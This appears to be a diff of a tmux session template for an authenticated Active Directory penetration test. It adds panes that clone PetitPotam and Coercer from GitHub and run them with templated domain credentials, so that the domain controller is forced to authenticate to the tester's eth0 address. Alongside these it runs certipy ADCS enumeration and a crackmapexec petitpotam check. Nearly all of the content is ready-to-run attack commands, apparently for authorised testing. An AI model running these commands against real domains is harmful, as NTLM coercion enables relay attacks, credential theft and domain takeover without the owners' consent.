@@ -101,10 +101,20 @@ windows:
           - certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/certipy.txt
   - PetitPotam: 
       panes:
-        - PetitPotam:
+        - cme petit:
           - tmux select-pane -T 'PetitPotam' -t "authd:PetitPotam.0"
-          - cd <%= @settings["rootDir"] %>/scans
+          - git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam
           - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam.txt
+        - PetitPotam.py:
+          - tmux select-pane -T 'PetitPotam.py' -t "authd:PetitPotam.1"
+          - git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam
+          - nomadIPeth0=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
+          - python3 PetitPotam.py -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $nomadIPeth0 $(cat /RSM/dcIP.txt | head -n 1)
+        - Coercer:
+          - tmux select-pane -T 'Coercer' -t "authd:PetitPotam.2"
+          - git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer && cd /opt/nomad-tools/Coercer && pipenv install
+          - nomadIPeth0=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
+          - pipenv run python3 Coercer.py coerce -l $nomadIPeth0 -t $(cat /RSM/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -v
   - misc: 
       panes:
         - printNightmare:
